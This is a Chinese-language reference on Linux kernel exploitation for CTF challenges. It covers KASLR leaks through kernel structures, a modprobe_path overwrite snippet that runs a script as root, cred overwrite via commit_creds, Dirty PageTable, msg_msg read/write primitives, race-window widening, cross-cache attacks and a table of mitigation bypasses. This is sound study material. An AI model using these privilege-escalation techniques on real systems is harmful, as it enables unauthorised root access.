# Pwn 内核利用方法论 — 结构体泄漏、落点与竞态

> 内核 pwn 详细参考。标准流程见 `$SHARED_DIR/knowledge-base/pwn-methodology.md`。
> 本文件聚焦 Linux 内核漏洞利用（LPE/提权）。用户态堆利用见 `pwn-heap-methodology.md`。

## 触发条件

- 题目提供内核镜像（`bzImage`）+ 文件系统（`rootfs.cpio`/`initramfs.cpio.gz`）+ 启动脚本（`boot.sh`/`run.sh`）
- 或题目描述提到 kernel/driver/LPE/内核模块
- `dmesg` 或驱动源码中看到 `kmalloc`/`copy_from_user`/`ioctl`

## §1 基础设施

### 环境搭建
```bash
# 解包文件系统
mkdir rootfs && cd rootfs
zcat ../rootfs.cpio.gz | cpio -idmv

# 添加 exploit（编译时用对应内核的 gcc + 静态链接）
gcc -static -o exploit exploit.c
# 或 musl-gcc -static -o exploit exploit.c（更小）

# 重新打包
find . | cpio -o --format=newc | gzip > ../rootfs.cpio.gz

# qemu 启动（典型参数）
qemu-system-x86_64 -kernel bzImage -initrd rootfs.cpio.gz \
  -append "console=ttyS0 root=/dev/ram quiet" -nographic -m 128M
# 如需调试加: -s（gdbserver :1234）-S（暂停启动）
```

### 内核符号表
- 有 `/proc/kallsyms`：直接 `cat /proc/kallsyms | grep commit_creds`
- 无（KASLR + 隐藏符号）：需要泄漏内核基址（见 §2）

## §2 结构体泄漏表（KASLR 绕过）

> UAF 块被含函数指针的内核结构体重用 → 读出函数指针 → 计算内核基址。

| 结构体 | 触发方式 | kmalloc slab | 泄漏内容 |
|--------|---------|-------------|---------|
| `tty_struct` | `open("/dev/ptmx")` | 0x2e0 (kmalloc-1024) | `tty_operations` 指针（含 kernel .text 地址） |
| `seq_operations` | `open("/proc/self/stat")` | kmalloc-32 | 4 个函数指针（start/stop/next/show） |
| `msg_msg` | `msgsnd()` | 可变（按消息长度选 slab） | 配合 MSG_COPY 可部分读；改 `m_ts` 越界读 |
| `pipe_buffer` | `pipe()` + `write()` | kmalloc-1024 | `anon_pipe_buf_ops` 指针 |
| `shm_file_data` | `shmat()` | kmalloc-64 | 多个内核指针 |

**泄漏后计算**：
```c
// 假设泄漏了 tty_operations 地址
kernel_base = leaked_addr - known_offset;  // offset 从 /proc/kallsyms 或 vmlinux 获取
```

## §3 内核落点

### 落点 A：modprobe_path（最简单 LPE）
**场景**: 有内核任意写，`modprobe_path` 未受 CONFIG 保护

```c
// 1. 泄漏 kernel base，算出 modprobe_path 地址
// 2. 任意写覆盖 modprobe_path 为 "/tmp/x"
// 3. 写提权脚本
system("echo '#!/bin/sh\necho 0 > /proc/sys/kernel/kptr_restrict\nchmod 777 /flag' > /tmp/x");
chmod("/tmp/x", 0777);
// 4. 触发 modprobe（执行未知格式文件）
system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/bad");
chmod("/tmp/bad", 0777);
system("/tmp/bad");  // 内核调用 modprobe_path → 以 root 执行 /tmp/x
// 5. 读 flag
system("cat /flag");
```

### 落点 B：cred 覆写
**场景**: 能控制函数指针调用（如 commit_creds/prepare_kernel_cred 可达）

```c
// 经典 ROP/函数指针调用链
commit_creds(prepare_kernel_cred(0));  // 当前进程提权到 root
// 然后返回用户态（需正确处理 KPTI）
```

### 落点 C：Dirty PageTable（PTE 劫持）
**场景**: 页级 UAF，高级内核题（2022-2026 主流）

```
原理: 页级 UAF → PTE 页回收 → 改 PTE 物理页号指向任意物理页
步骤:
  1. 制造 page-level UAF（通过 cross-cache 回收到 PCP 分配器）
  2. 喷射 PTE 页占位（大量 mmap 使内核分配页表页）
  3. 改写 PTE 项: 修改物理页号字段指向目标物理地址
  4. 通过该 PTE 映射的虚拟地址读写任意物理内存
  5. 改 creds 或覆盖 suid 二进制
变体（ptr-yudai DiceCTF 2026）: 重叠"匿名页 PTE"与"文件页 PTE"，
  使只读文件映射经匿名侧可写 → 任意文件写
```

## §4 msg_msg 任意读写

**核心**: msg_msg 头部有 `m_ts`（消息大小）和 `next`（指向 msg_msgseg 数据段）。

```
任意读:
  1. msgsnd 申请 msg_msg（可控制 size 选 kmalloc slab）
  2. UAF 改大 m_ts → 越界读邻居 slab 泄漏
  3. 伪造 next 指针 → 任意地址读
  4. msgrcv 配合 MSG_COPY 实现无破坏读

任意写:
  配合 pipe_buffer / sk_buff（含有 write 函数指针的 ops）实现
```

## §5 竞态窗口扩大法（userfaultfd 替代）

> 现代 kernel 题 `userfaultfd` 普遍被禁用（需 `CAP_SYS_PTRACE`）。以下是替代方案。

| 方法 | 原理 | 适用场景 |
|------|------|---------|
| **FUSE** | 用户态 FUSE 文件系统阻塞内核 `read`，stall `copy_from_user` | 能触发内核读用户态数据 |
| **MADV_DONTNEED + 并发 mprotect** | MADV_DONTNEED 清 PTE 使每页缺页；另一线程疯狂 mprotect 翻转权限争抢 mmap_lock，把毫秒级窗口拖到数十秒 | 长遍历（哈希/check）中的竞态（ptr-yudai DiceCTF 2026 首创） |
| **io_uring** | 异步 IO stall | 内核 ≥ 5.1 且未禁 io_uring |
| **fallocate** | `fallocate(FALLOC_FL_PUNCH_HOLE)` 延迟 | 特定文件操作竞态 |
| **SIGALRM + 多线程** | 在 io 操作中插入可中断点 | 简单竞态 |

### MADV_DONTNEED + mprotect 详解（ptr-yudai 首创）
```c
// 线程 A: 疯狂翻转权限
while (racing) {
    mprotect(page, PAGE_SIZE, PROT_READ);
    mprotect(page, PAGE_SIZE, PROT_READ | PROT_WRITE);
    usleep(1);
}
// 主线程: MADV_DONTNEED 使 PTE 失效
madvise(page, PAGE_SIZE, MADV_DONTNEED);
// 线程 B: 触发长遍历（使缺页重试，拖住内核）
// → 在窗口内竞态触发漏洞
```

## §6 cross-cache 攻击（跨 slab 缓存）

**场景**: 独立 slab 缓存（`SLAB_NO_MERGE`）的 UAF 只能拿到同类对象，需要跨类型重用。

```
原理: 把独立缓存的页归还 buddy allocator，再用别的 slab（msg_msg/pipe/PTE 页）回收该页
步骤（ptr-yudai cross-CPU 法）:
  1. sched_setaffinity 绑定 CPU0 分配、CPU1 释放
  2. 持续刷满 CPU partial（cpu_partial 阈值）→ node partial → discard_slab
  3. 页回 buddy/PCP 后喷射目标结构体（msg_msg/pipe/PTE 页）回收
  4. UAF 块与目标结构体重叠 → 读写目标内容
```

## §7 mitigations 绕过组合

| 缓解 | 绕过 |
|------|------|
| KASLR | §2 结构体函数指针泄漏 |
| SMEP（不可执行用户页） | 内核 ROP / 栈迁移 / pt_regs 中的用户栈做 ROP |
| SMAP（不可读用户页） | `copy_from/to_user` / msg_msg 等内核内数据 |
| KPTI（隔离页表） | `swapgs_restore_regs_and_return_to_usermode` 跳板 |
| kCFI（函数指针类型校验） | 同签名合法目标（如 commit_creds 与同类函数） |
| CFI 严苛时 | 改用非函数指针落点（modprobe_path / Dirty PageTable / 任意文件写） |

**返回用户态**（绕 KPTI）:
```c
// 不能直接 ret 到用户态函数（KPTI 隔离）
// 用 swapgs_restore_regs_and_return_to_usermode + offset
// 或 modprobe_path 路径（无需切态）
```

## §8 关联文件

- `$SHARED_DIR/knowledge-base/pwn-methodology.md` — 标准 8 步流程、mitigations 速查
- `$SHARED_DIR/knowledge-base/pwn-heap-methodology.md` — 用户态堆利用详解
- 源文档库: ptr-yudai DiceCTF 2026 cornelslop writeup（待下载）、ctf-wiki kernel pwn（待下载）
